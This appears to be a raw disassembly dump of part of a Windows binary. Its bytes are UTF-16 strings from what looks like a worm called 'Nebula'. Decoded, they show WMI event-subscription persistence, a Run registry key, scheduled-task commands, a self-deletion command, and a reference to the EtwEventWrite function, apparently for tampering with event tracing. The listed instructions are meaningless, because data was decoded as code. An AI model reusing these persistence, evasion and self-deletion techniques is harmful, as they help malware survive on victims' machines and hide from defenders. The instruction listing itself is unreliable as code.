  409639:	00 48 00             	add    %cl,0x0(%eax)
  40963c:	20 00                	and    %al,(%eax)
  40963e:	5f                   	pop    %edi
  40963f:	00 5f 00             	add    %bl,0x0(%edi)
  409642:	45                   	inc    %ebp
  409643:	00 76 00             	add    %dh,0x0(%esi)
  409646:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40964a:	74 00                	je     0x40964c
  40964c:	46                   	inc    %esi
  40964d:	00 69 00             	add    %ch,0x0(%ecx)
  409650:	6c                   	insb   (%dx),%es:(%edi)
  409651:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409655:	00 72 00             	add    %dh,0x0(%edx)
  409658:	20 00                	and    %al,(%eax)
  40965a:	44                   	inc    %esp
  40965b:	00 45 00             	add    %al,0x0(%ebp)
  40965e:	4c                   	dec    %esp
  40965f:	00 45 00             	add    %al,0x0(%ebp)
  409662:	54                   	push   %esp
  409663:	00 45 00             	add    %al,0x0(%ebp)
  409666:	00 80 97 2f 00 63    	add    %al,0x63002f97(%eax)
  40966c:	00 20                	add    %ah,(%eax)
  40966e:	00 77 00             	add    %dh,0x0(%edi)
  409671:	6d                   	insl   (%dx),%es:(%edi)
  409672:	00 69 00             	add    %ch,0x0(%ecx)
  409675:	63 00                	arpl   %eax,(%eax)
  409677:	20 00                	and    %al,(%eax)
  409679:	2f                   	das
  40967a:	00 6e 00             	add    %ch,0x0(%esi)
  40967d:	61                   	popa
  40967e:	00 6d 00             	add    %ch,0x0(%ebp)
  409681:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409685:	70 00                	jo     0x409687
  409687:	61                   	popa
  409688:	00 63 00             	add    %ah,0x0(%ebx)
  40968b:	65 00 3a             	add    %bh,%gs:(%edx)
  40968e:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  409692:	00 72 00             	add    %dh,0x0(%edx)
  409695:	6f                   	outsl  %ds:(%esi),(%dx)
  409696:	00 6f 00             	add    %ch,0x0(%edi)
  409699:	74 00                	je     0x40969b
  40969b:	5c                   	pop    %esp
  40969c:	00 73 00             	add    %dh,0x0(%ebx)
  40969f:	75 00                	jne    0x4096a1
  4096a1:	62 00                	bound  %eax,(%eax)
  4096a3:	73 00                	jae    0x4096a5
  4096a5:	63 00                	arpl   %eax,(%eax)
  4096a7:	72 00                	jb     0x4096a9
  4096a9:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  4096af:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4096b5:	20 00                	and    %al,(%eax)
  4096b7:	50                   	push   %eax
  4096b8:	00 41 00             	add    %al,0x0(%ecx)
  4096bb:	54                   	push   %esp
  4096bc:	00 48 00             	add    %cl,0x0(%eax)
  4096bf:	20 00                	and    %al,(%eax)
  4096c1:	43                   	inc    %ebx
  4096c2:	00 6f 00             	add    %ch,0x0(%edi)
  4096c5:	6d                   	insl   (%dx),%es:(%edi)
  4096c6:	00 6d 00             	add    %ch,0x0(%ebp)
  4096c9:	61                   	popa
  4096ca:	00 6e 00             	add    %ch,0x0(%esi)
  4096cd:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  4096d2:	00 6e 00             	add    %ch,0x0(%esi)
  4096d5:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  4096d9:	76 00                	jbe    0x4096db
  4096db:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4096df:	74 00                	je     0x4096e1
  4096e1:	43                   	inc    %ebx
  4096e2:	00 6f 00             	add    %ch,0x0(%edi)
  4096e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4096e6:	00 73 00             	add    %dh,0x0(%ebx)
  4096e9:	75 00                	jne    0x4096eb
  4096eb:	6d                   	insl   (%dx),%es:(%edi)
  4096ec:	00 65 00             	add    %ah,0x0(%ebp)
  4096ef:	72 00                	jb     0x4096f1
  4096f1:	20 00                	and    %al,(%eax)
  4096f3:	44                   	inc    %esp
  4096f4:	00 45 00             	add    %al,0x0(%ebp)
  4096f7:	4c                   	dec    %esp
  4096f8:	00 45 00             	add    %al,0x0(%ebp)
  4096fb:	54                   	push   %esp
  4096fc:	00 45 00             	add    %al,0x0(%ebp)
  4096ff:	00 80 99 2f 00 63    	add    %al,0x63002f99(%eax)
  409705:	00 20                	add    %ah,(%eax)
  409707:	00 77 00             	add    %dh,0x0(%edi)
  40970a:	6d                   	insl   (%dx),%es:(%edi)
  40970b:	00 69 00             	add    %ch,0x0(%ecx)
  40970e:	63 00                	arpl   %eax,(%eax)
  409710:	20 00                	and    %al,(%eax)
  409712:	2f                   	das
  409713:	00 6e 00             	add    %ch,0x0(%esi)
  409716:	61                   	popa
  409717:	00 6d 00             	add    %ch,0x0(%ebp)
  40971a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40971e:	70 00                	jo     0x409720
  409720:	61                   	popa
  409721:	00 63 00             	add    %ah,0x0(%ebx)
  409724:	65 00 3a             	add    %bh,%gs:(%edx)
  409727:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  40972b:	00 72 00             	add    %dh,0x0(%edx)
  40972e:	6f                   	outsl  %ds:(%esi),(%dx)
  40972f:	00 6f 00             	add    %ch,0x0(%edi)
  409732:	74 00                	je     0x409734
  409734:	5c                   	pop    %esp
  409735:	00 73 00             	add    %dh,0x0(%ebx)
  409738:	75 00                	jne    0x40973a
  40973a:	62 00                	bound  %eax,(%eax)
  40973c:	73 00                	jae    0x40973e
  40973e:	63 00                	arpl   %eax,(%eax)
  409740:	72 00                	jb     0x409742
  409742:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409748:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40974e:	20 00                	and    %al,(%eax)
  409750:	50                   	push   %eax
  409751:	00 41 00             	add    %al,0x0(%ecx)
  409754:	54                   	push   %esp
  409755:	00 48 00             	add    %cl,0x0(%eax)
  409758:	20 00                	and    %al,(%eax)
  40975a:	5f                   	pop    %edi
  40975b:	00 5f 00             	add    %bl,0x0(%edi)
  40975e:	46                   	inc    %esi
  40975f:	00 69 00             	add    %ch,0x0(%ecx)
  409762:	6c                   	insb   (%dx),%es:(%edi)
  409763:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409767:	00 72 00             	add    %dh,0x0(%edx)
  40976a:	54                   	push   %esp
  40976b:	00 6f 00             	add    %ch,0x0(%edi)
  40976e:	43                   	inc    %ebx
  40976f:	00 6f 00             	add    %ch,0x0(%edi)
  409772:	6e                   	outsb  %ds:(%esi),(%dx)
  409773:	00 73 00             	add    %dh,0x0(%ebx)
  409776:	75 00                	jne    0x409778
  409778:	6d                   	insl   (%dx),%es:(%edi)
  409779:	00 65 00             	add    %ah,0x0(%ebp)
  40977c:	72 00                	jb     0x40977e
  40977e:	42                   	inc    %edx
  40977f:	00 69 00             	add    %ch,0x0(%ecx)
  409782:	6e                   	outsb  %ds:(%esi),(%dx)
  409783:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  409787:	00 6e 00             	add    %ch,0x0(%esi)
  40978a:	67 00 20             	add    %ah,(%bx,%si)
  40978d:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  409791:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  409795:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  409799:	00 00                	add    %al,(%eax)
  40979b:	5b                   	pop    %ebx
  40979c:	53                   	push   %ebx
  40979d:	00 6f 00             	add    %ch,0x0(%edi)
  4097a0:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4097a5:	00 61 00             	add    %ah,0x0(%ecx)
  4097a8:	72 00                	jb     0x4097aa
  4097aa:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4097af:	00 69 00             	add    %ch,0x0(%ecx)
  4097b2:	63 00                	arpl   %eax,(%eax)
  4097b4:	72 00                	jb     0x4097b6
  4097b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4097b7:	00 73 00             	add    %dh,0x0(%ebx)
  4097ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4097bb:	00 66 00             	add    %ah,0x0(%esi)
  4097be:	74 00                	je     0x4097c0
  4097c0:	5c                   	pop    %esp
  4097c1:	00 57 00             	add    %dl,0x0(%edi)
  4097c4:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4097ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4097cb:	00 77 00             	add    %dh,0x0(%edi)
  4097ce:	73 00                	jae    0x4097d0
  4097d0:	5c                   	pop    %esp
  4097d1:	00 43 00             	add    %al,0x0(%ebx)
  4097d4:	75 00                	jne    0x4097d6
  4097d6:	72 00                	jb     0x4097d8
  4097d8:	72 00                	jb     0x4097da
  4097da:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4097de:	74 00                	je     0x4097e0
  4097e0:	56                   	push   %esi
  4097e1:	00 65 00             	add    %ah,0x0(%ebp)
  4097e4:	72 00                	jb     0x4097e6
  4097e6:	73 00                	jae    0x4097e8
  4097e8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4097ee:	5c                   	pop    %esp
  4097ef:	00 52 00             	add    %dl,0x0(%edx)
  4097f2:	75 00                	jne    0x4097f4
  4097f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f5:	00 00                	add    %al,(%eax)
  4097f7:	80 ab 2f 00 63 00 20 	subb   $0x20,0x63002f(%ebx)
  4097fe:	00 73 00             	add    %dh,0x0(%ebx)
  409801:	63 00                	arpl   %eax,(%eax)
  409803:	68 00 74 00 61       	push   $0x61007400
  409808:	00 73 00             	add    %dh,0x0(%ebx)
  40980b:	6b 00 73             	imul   $0x73,(%eax),%eax
  40980e:	00 20                	add    %ah,(%eax)
  409810:	00 2f                	add    %ch,(%edi)
  409812:	00 71 00             	add    %dh,0x0(%ecx)
  409815:	75 00                	jne    0x409817
  409817:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40981b:	79 00                	jns    0x40981d
  40981d:	20 00                	and    %al,(%eax)
  40981f:	7c 00                	jl     0x409821
  409821:	20 00                	and    %al,(%eax)
  409823:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  409827:	6e                   	outsb  %ds:(%esi),(%dx)
  409828:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40982c:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409830:	00 20                	add    %ah,(%eax)
  409832:	00 2f                	add    %ch,(%edi)
  409834:	00 69 00             	add    %ch,0x0(%ecx)
  409837:	20 00                	and    %al,(%eax)
  409839:	22 00                	and    (%eax),%al
  40983b:	4e                   	dec    %esi
  40983c:	00 65 00             	add    %ah,0x0(%ebp)
  40983f:	62 00                	bound  %eax,(%eax)
  409841:	75 00                	jne    0x409843
  409843:	6c                   	insb   (%dx),%es:(%edi)
  409844:	00 61 00             	add    %ah,0x0(%ecx)
  409847:	22 00                	and    (%eax),%al
  409849:	20 00                	and    %al,(%eax)
  40984b:	3e 00 6e 00          	add    %ch,%ds:0x0(%esi)
  40984f:	75 00                	jne    0x409851
  409851:	6c                   	insb   (%dx),%es:(%edi)
  409852:	00 20                	add    %ah,(%eax)
  409854:	00 26                	add    %ah,(%esi)
  409856:	00 26                	add    %ah,(%esi)
  409858:	00 20                	add    %ah,(%eax)
  40985a:	00 73 00             	add    %dh,0x0(%ebx)
  40985d:	63 00                	arpl   %eax,(%eax)
  40985f:	68 00 74 00 61       	push   $0x61007400
  409864:	00 73 00             	add    %dh,0x0(%ebx)
  409867:	6b 00 73             	imul   $0x73,(%eax),%eax
  40986a:	00 20                	add    %ah,(%eax)
  40986c:	00 2f                	add    %ch,(%edi)
  40986e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  409872:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409876:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40987a:	00 20                	add    %ah,(%eax)
  40987c:	00 2f                	add    %ch,(%edi)
  40987e:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  409882:	00 20                	add    %ah,(%eax)
  409884:	00 22                	add    %ah,(%edx)
  409886:	00 4e 00             	add    %cl,0x0(%esi)
  409889:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40988d:	75 00                	jne    0x40988f
  40988f:	6c                   	insb   (%dx),%es:(%edi)
  409890:	00 61 00             	add    %ah,0x0(%ecx)
  409893:	54                   	push   %esp
  409894:	00 61 00             	add    %ah,0x0(%ecx)
  409897:	73 00                	jae    0x409899
  409899:	6b 00 22             	imul   $0x22,(%eax),%eax
  40989c:	00 20                	add    %ah,(%eax)
  40989e:	00 2f                	add    %ch,(%edi)
  4098a0:	00 66 00             	add    %ah,0x0(%esi)
  4098a3:	00 0d 4e 00 65 00    	add    %cl,0x65004e
  4098a9:	62 00                	bound  %eax,(%eax)
  4098ab:	75 00                	jne    0x4098ad
  4098ad:	6c                   	insb   (%dx),%es:(%edi)
  4098ae:	00 61 00             	add    %ah,0x0(%ecx)
  4098b1:	00 11                	add    %dl,(%ecx)
  4098b3:	77 00                	ja     0x4098b5
  4098b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4098b6:	00 72 00             	add    %dh,0x0(%edx)
  4098b9:	6d                   	insl   (%dx),%es:(%edi)
  4098ba:	00 2e                	add    %ch,(%esi)
  4098bc:	00 65 00             	add    %ah,0x0(%ebp)
  4098bf:	78 00                	js     0x4098c1
  4098c1:	65 00 00             	add    %al,%gs:(%eax)
  4098c4:	29 2f                	sub    %ebp,(%edi)
  4098c6:	00 63 00             	add    %ah,0x0(%ebx)
  4098c9:	20 00                	and    %al,(%eax)
  4098cb:	74 00                	je     0x4098cd
  4098cd:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  4098d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d4:	00 75 00             	add    %dh,0x0(%ebp)
  4098d7:	74 00                	je     0x4098d9
  4098d9:	20 00                	and    %al,(%eax)
  4098db:	32 00                	xor    (%eax),%al
  4098dd:	20 00                	and    %al,(%eax)
  4098df:	26 00 20             	add    %ah,%es:(%eax)
  4098e2:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4098e6:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4098ea:	00 22                	add    %ah,(%edx)
  4098ec:	00 00                	add    %al,(%eax)
  4098ee:	03 22                	add    (%edx),%esp
  4098f0:	00 00                	add    %al,(%eax)
  4098f2:	07                   	pop    %es
  4098f3:	5c                   	pop    %esp
  4098f4:	00 73 00             	add    %dh,0x0(%ebx)
  4098f7:	2b 00                	sub    (%eax),%eax
  4098f9:	00 01                	add    %al,(%ecx)
  4098fb:	00 53 54             	add    %dl,0x54(%ebx)
  4098fe:	00 48 00             	add    %cl,0x0(%eax)
  409901:	49                   	dec    %ecx
  409902:	00 53 00             	add    %dl,0x0(%ebx)
  409905:	20 00                	and    %al,(%eax)
  409907:	49                   	dec    %ecx
  409908:	00 53 00             	add    %dl,0x0(%ebx)
  40990b:	20 00                	and    %al,(%eax)
  40990d:	41                   	inc    %ecx
  40990e:	00 20                	add    %ah,(%eax)
  409910:	00 45 00             	add    %al,0x0(%ebp)
  409913:	58                   	pop    %eax
  409914:	00 41 00             	add    %al,0x0(%ecx)
  409917:	4d                   	dec    %ebp
  409918:	00 50 00             	add    %dl,0x0(%eax)
  40991b:	4c                   	dec    %esp
  40991c:	00 45 00             	add    %al,0x0(%ebp)
  40991f:	20 00                	and    %al,(%eax)
  409921:	3d 00 20 00 34       	cmp    $0x34002000,%eax
  409926:	00 41 00             	add    %al,0x0(%ecx)
  409929:	20 00                	and    %al,(%eax)
  40992b:	35 00 41 00 20       	xor    $0x20004100,%eax
  409930:	00 39                	add    %bh,(%ecx)
  409932:	00 30                	add    %dh,(%eax)
  409934:	00 20                	add    %ah,(%eax)
  409936:	00 41 00             	add    %al,0x0(%ecx)
  409939:	4e                   	dec    %esi
  40993a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40993e:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  409942:	00 45 00             	add    %al,0x0(%ebp)
  409945:	20 00                	and    %al,(%eax)
  409947:	52                   	push   %edx
  409948:	00 45 00             	add    %al,0x0(%ebp)
  40994b:	53                   	push   %ebx
  40994c:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  409950:	19 65 00             	sbb    %esp,0x0(%ebp)
  409953:	78 00                	js     0x409955
  409955:	70 00                	jo     0x409957
  409957:	6c                   	insb   (%dx),%es:(%edi)
  409958:	00 6f 00             	add    %ch,0x0(%edi)
  40995b:	72 00                	jb     0x40995d
  40995d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409961:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409965:	78 00                	js     0x409967
  409967:	65 00 00             	add    %al,%gs:(%eax)
  40996a:	13 6e 00             	adc    0x0(%esi),%ebp
  40996d:	74 00                	je     0x40996f
  40996f:	64 00 6c 00 6c       	add    %ch,%fs:0x6c(%eax,%eax,1)
  409974:	00 2e                	add    %ch,(%esi)
  409976:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40997a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40997e:	1b 45 00             	sbb    0x0(%ebp),%eax
  409981:	74 00                	je     0x409983
  409983:	77 00                	ja     0x409985
  409985:	45                   	inc    %ebp
  409986:	00 76 00             	add    %dh,0x0(%esi)
  409989:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40998d:	74 00                	je     0x40998f
  40998f:	57                   	push   %edi
  409990:	00 72 00             	add    %dh,0x0(%edx)
  409993:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  409999:	00 81 09 53 00 45    	add    %al,0x45005309(%ecx)
  40999f:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4099a3:	00 43 00             	add    %al,0x0(%ebx)
  4099a6:	54                   	push   %esp
  4099a7:	00 20                	add    %ah,(%eax)
  4099a9:	00 2a                	add    %ch,(%edx)
  4099ab:	00 20                	add    %ah,(%eax)
  4099ad:	00 46 00             	add    %al,0x0(%esi)
  4099b0:	52                   	push   %edx
  4099b1:	00 4f 00             	add    %cl,0x0(%edi)
  4099b4:	4d                   	dec    %ebp
  4099b5:	00 20                	add    %ah,(%eax)
  4099b7:	00 5f 00             	add    %bl,0x0(%edi)
  4099ba:	5f                   	pop    %edi
  4099bb:	00 49 00             	add    %cl,0x0(%ecx)
  4099be:	6e                   	outsb  %ds:(%esi),(%dx)
  4099bf:	00 73 00             	add    %dh,0x0(%ebx)
  4099c2:	74 00                	je     0x4099c4
  4099c4:	61                   	popa
  4099c5:	00 6e 00             	add    %ch,0x0(%esi)
  4099c8:	63 00                	arpl   %eax,(%eax)
  4099ca:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  4099ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4099cf:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4099d3:	00 66 00             	add    %ah,0x0(%esi)
  4099d6:	69 00 63 00 61 00    	imul   $0x610063,(%eax),%eax
  4099dc:	74 00                	je     0x4099de
  4099de:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4099e4:	45                   	inc    %ebp
  4099e5:	00 76 00             	add    %dh,0x0(%esi)
  4099e8:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4099ec:	74 00                	je     0x4099ee
  4099ee:	20 00                	and    %al,(%eax)
  4099f0:	57                   	push   %edi
  4099f1:	00 49 00             	add    %cl,0x0(%ecx)
  4099f4:	54                   	push   %esp
  4099f5:	00 48 00             	add    %cl,0x0(%eax)
  4099f8:	49                   	dec    %ecx
  4099f9:	00 4e 00             	add    %cl,0x0(%esi)
  4099fc:	20 00                	and    %al,(%eax)
  4099fe:	36 00 30             	add    %dh,%ss:(%eax)
  409a01:	00 20                	add    %ah,(%eax)
  409a03:	00 57 00             	add    %dl,0x0(%edi)
  409a06:	48                   	dec    %eax
  409a07:	00 45 00             	add    %al,0x0(%ebp)
  409a0a:	52                   	push   %edx
  409a0b:	00 45 00             	add    %al,0x0(%ebp)
  409a0e:	20 00                	and    %al,(%eax)
  409a10:	54                   	push   %esp
  409a11:	00 61 00             	add    %ah,0x0(%ecx)
  409a14:	72 00                	jb     0x409a16
  409a16:	67 00 65 00          	add    %ah,0x0(%di)
  409a1a:	74 00                	je     0x409a1c
  409a1c:	49                   	dec    %ecx
  409a1d:	00 6e 00             	add    %ch,0x0(%esi)
  409a20:	73 00                	jae    0x409a22
  409a22:	74 00                	je     0x409a24
  409a24:	61                   	popa
  409a25:	00 6e 00             	add    %ch,0x0(%esi)
  409a28:	63 00                	arpl   %eax,(%eax)
  409a2a:	65 00 20             	add    %ah,%gs:(%eax)
  409a2d:	00 49 00             	add    %cl,0x0(%ecx)
  409a30:	53                   	push   %ebx
  409a31:	00 41 00             	add    %al,0x0(%ecx)
  409a34:	20 00                	and    %al,(%eax)
  409a36:	27                   	daa
  409a37:	00 57 00             	add    %dl,0x0(%edi)
  409a3a:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  409a40:	32 00                	xor    (%eax),%al
  409a42:	5f                   	pop    %edi
  409a43:	00 43 00             	add    %al,0x0(%ebx)
  409a46:	6f                   	outsl  %ds:(%esi),(%dx)
  409a47:	00 6d 00             	add    %ch,0x0(%ebp)
  409a4a:	70 00                	jo     0x409a4c
  409a4c:	75 00                	jne    0x409a4e
  409a4e:	74 00                	je     0x409a50
  409a50:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409a54:	53                   	push   %ebx
  409a55:	00 79 00             	add    %bh,0x0(%ecx)
  409a58:	73 00                	jae    0x409a5a
  409a5a:	74 00                	je     0x409a5c
  409a5c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409a60:	27                   	daa
  409a61:	00 20                	add    %ah,(%eax)
  409a63:	00 41 00             	add    %al,0x0(%ecx)
  409a66:	4e                   	dec    %esi
  409a67:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  409a6b:	00 54 00 61          	add    %dl,0x61(%eax,%eax,1)
  409a6f:	00 72 00             	add    %dh,0x0(%edx)
  409a72:	67 00 65 00          	add    %ah,0x0(%di)
  409a76:	74 00                	je     0x409a78
  409a78:	49                   	dec    %ecx
  409a79:	00 6e 00             	add    %ch,0x0(%esi)
  409a7c:	73 00                	jae    0x409a7e
  409a7e:	74 00                	je     0x409a80
  409a80:	61                   	popa
  409a81:	00 6e 00             	add    %ch,0x0(%esi)
  409a84:	63 00                	arpl   %eax,(%eax)
  409a86:	65 00 2e             	add    %ch,%gs:(%esi)
  409a89:	00 53 00             	add    %dl,0x0(%ebx)
  409a8c:	74 00                	je     0x409a8e
  409a8e:	61                   	popa
  409a8f:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  409a93:	00 73 00             	add    %dh,0x0(%ebx)
  409a96:	20 00                	and    %al,(%eax)
  409a98:	3d 00 20 00 27       	cmp    $0x27002000,%eax
  409a9d:	00 4f 00             	add    %cl,0x0(%edi)
  409aa0:	4b                   	dec    %ebx
  409aa1:	00 27                	add    %ah,(%edi)
  409aa3:	00 01                	add    %al,(%ecx)
  409aa5:	2b 5c 00 5c          	sub    0x5c(%eax,%eax,1),%ebx
  409aa9:	00 2e                	add    %ch,(%esi)
  409aab:	00 5c 00 72          	add    %bl,0x72(%eax,%eax,1)
  409aaf:	00 6f 00             	add    %ch,0x0(%edi)
  409ab2:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab3:	00 74 00 5c          	add    %dh,0x5c(%eax,%eax,1)
  409ab7:	00 73 00             	add    %dh,0x0(%ebx)
  409aba:	75 00                	jne    0x409abc
  409abc:	62 00                	bound  %eax,(%eax)
  409abe:	73 00                	jae    0x409ac0
  409ac0:	63 00                	arpl   %eax,(%eax)
  409ac2:	72 00                	jb     0x409ac4
  409ac4:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409aca:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409ad0:	00 1b                	add    %bl,(%ebx)
  409ad2:	5f                   	pop    %edi
  409ad3:	00 5f 00             	add    %bl,0x0(%edi)
  409ad6:	45                   	inc    %ebp
  409ad7:	00 76 00             	add    %dh,0x0(%esi)
  409ada:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409ade:	74 00                	je     0x409ae0
  409ae0:	46                   	inc    %esi
  409ae1:	00 69 00             	add    %ch,0x0(%ecx)
  409ae4:	6c                   	insb   (%dx),%es:(%edi)
  409ae5:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409ae9:	00 72 00             	add    %dh,0x0(%edx)
  409aec:	00 09                	add    %cl,(%ecx)
  409aee:	4e                   	dec    %esi
  409aef:	00 61 00             	add    %ah,0x0(%ecx)
  409af2:	6d                   	insl   (%dx),%es:(%edi)
  409af3:	00 65 00             	add    %ah,0x0(%ebp)
  409af6:	00 19                	add    %bl,(%ecx)
  409af8:	4e                   	dec    %esi
  409af9:	00 65 00             	add    %ah,0x0(%ebp)
  409afc:	62 00                	bound  %eax,(%eax)
  409afe:	75 00                	jne    0x409b00
  409b00:	6c                   	insb   (%dx),%es:(%edi)
  409b01:	00 61 00             	add    %ah,0x0(%ecx)
  409b04:	46                   	inc    %esi
  409b05:	00 69 00             	add    %ch,0x0(%ecx)
  409b08:	6c                   	insb   (%dx),%es:(%edi)
  409b09:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409b0d:	00 72 00             	add    %dh,0x0(%edx)
  409b10:	00 0b                	add    %cl,(%ebx)
  409b12:	51                   	push   %ecx
  409b13:	00 75 00             	add    %dh,0x0(%ebp)
  409b16:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409b1a:	79 00                	jns    0x409b1c
  409b1c:	00 1b                	add    %bl,(%ebx)
  409b1e:	51                   	push   %ecx
  409b1f:	00 75 00             	add    %dh,0x0(%ebp)
  409b22:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409b26:	79 00                	jns    0x409b28
  409b28:	4c                   	dec    %esp
  409b29:	00 61 00             	add    %ah,0x0(%ecx)
  409b2c:	6e                   	outsb  %ds:(%esi),(%dx)
  409b2d:	00 67 00             	add    %ah,0x0(%edi)
  409b30:	75 00                	jne    0x409b32
  409b32:	61                   	popa
  409b33:	00 67 00             	add    %ah,0x0(%edi)
  409b36:	65 00 00             	add    %al,%gs:(%eax)
  409b39:	07                   	pop    %es
  409b3a:	57                   	push   %edi
  409b3b:	00 51 00             	add    %dl,0x0(%ecx)
  409b3e:	4c                   	dec    %esp
  409b3f:	00 00                	add    %al,(%eax)
  409b41:	1d 45 00 76 00       	sbb    $0x760045,%eax
  409b46:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409b4a:	74 00                	je     0x409b4c
  409b4c:	4e                   	dec    %esi
  409b4d:	00 61 00             	add    %ah,0x0(%ecx)
  409b50:	6d                   	insl   (%dx),%es:(%edi)
  409b51:	00 65 00             	add    %ah,0x0(%ebp)
  409b54:	73 00                	jae    0x409b56
  409b56:	70 00                	jo     0x409b58
  409b58:	61                   	popa
  409b59:	00 63 00             	add    %ah,0x0(%ebx)
  409b5c:	65 00 00             	add    %al,%gs:(%eax)
  409b5f:	15 72 00 6f 00       	adc    $0x6f0072,%eax
  409b64:	6f                   	outsl  %ds:(%esi),(%dx)
  409b65:	00 74 00 5c          	add    %dh,0x5c(%eax,%eax,1)
  409b69:	00 43 00             	add    %al,0x0(%ebx)
  409b6c:	49                   	dec    %ecx
  409b6d:	00 4d 00             	add    %cl,0x0(%ebp)
  409b70:	56                   	push   %esi
  409b71:	00 32                	add    %dh,(%edx)
  409b73:	00 00                	add    %al,(%eax)
  409b75:	31 43 00             	xor    %eax,0x0(%ebx)
  409b78:	6f                   	outsl  %ds:(%esi),(%dx)
  409b79:	00 6d 00             	add    %ch,0x0(%ebp)
  409b7c:	6d                   	insl   (%dx),%es:(%edi)
  409b7d:	00 61 00             	add    %ah,0x0(%ecx)
  409b80:	6e                   	outsb  %ds:(%esi),(%dx)
  409b81:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  409b85:	00 69 00             	add    %ch,0x0(%ecx)
  409b88:	6e                   	outsb  %ds:(%esi),(%dx)
  409b89:	00 65 00             	add    %ah,0x0(%ebp)
  409b8c:	45                   	inc    %ebp
  409b8d:	00 76 00             	add    %dh,0x0(%esi)
  409b90:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409b94:	74 00                	je     0x409b96
  409b96:	43                   	inc    %ebx
  409b97:	00 6f 00             	add    %ch,0x0(%edi)
  409b9a:	6e                   	outsb  %ds:(%esi),(%dx)
  409b9b:	00 73 00             	add    %dh,0x0(%ebx)
  409b9e:	75 00                	jne    0x409ba0
  409ba0:	6d                   	insl   (%dx),%es:(%edi)
  409ba1:	00 65 00             	add    %ah,0x0(%ebp)
  409ba4:	72 00                	jb     0x409ba6
  409ba6:	00 1d 4e 00 65 00    	add    %bl,0x65004e
  409bac:	62 00                	bound  %eax,(%eax)
  409bae:	75 00                	jne    0x409bb0
  409bb0:	6c                   	insb   (%dx),%es:(%edi)
  409bb1:	00 61 00             	add    %ah,0x0(%ecx)
  409bb4:	43                   	inc    %ebx
  409bb5:	00 6f 00             	add    %ch,0x0(%edi)
  409bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb9:	00 73 00             	add    %dh,0x0(%ebx)
  409bbc:	75 00                	jne    0x409bbe
  409bbe:	6d                   	insl   (%dx),%es:(%edi)
  409bbf:	00 65 00             	add    %ah,0x0(%ebp)
